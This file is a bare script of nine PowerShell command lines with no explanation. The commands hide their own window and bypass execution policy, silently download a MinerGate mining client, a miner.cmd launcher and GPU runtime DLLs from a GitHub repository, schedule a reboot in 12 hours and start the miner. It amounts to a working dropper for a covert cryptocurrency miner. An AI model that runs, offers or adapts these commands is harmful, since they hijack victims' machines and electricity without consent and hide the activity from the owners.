powershell -W Hidden -Exec Bypass cmd.exe /c %wget% -q https://github.com/mediatui/tool/master/multi/minergate-cli.exe
powershell -W Hidden -Exec Bypass cmd.exe /c %wget% -q https://raw.githubusercontent.com/mediatui/tool/master/multi/miner.cmd
powershell -W Hidden -Exec Bypass cmd.exe /c %wget% -q https://raw.githubusercontent.com/mediatui/tool/master/multi/msvcp140.dll
powershell -W Hidden -Exec Bypass cmd.exe /c %wget% -q https://raw.githubusercontent.com/mediatui/tool/master/multi/nvrtc64_92.dll
powershell -W Hidden -Exec Bypass cmd.exe /c %wget% -q https://raw.githubusercontent.com/mediatui/tool/master/multi/nvrtc-builtins64_92.dll
powershell -W Hidden -Exec Bypass cmd.exe /c %wget% -q https://raw.githubusercontent.com/mediatui/tool/master/multi/OpenCL.dll
powershell -W Hidden -Exec Bypass cmd.exe /c %wget% -q https://raw.githubusercontent.com/mediatui/tool/master/multi/vcruntime140.dll
powershell -W Hidden -Exec Bypass cmd.exe /c shutdown /r /t 43200
powershell -W Hidden -Exec Bypass cmd.exe /c miner.cmd
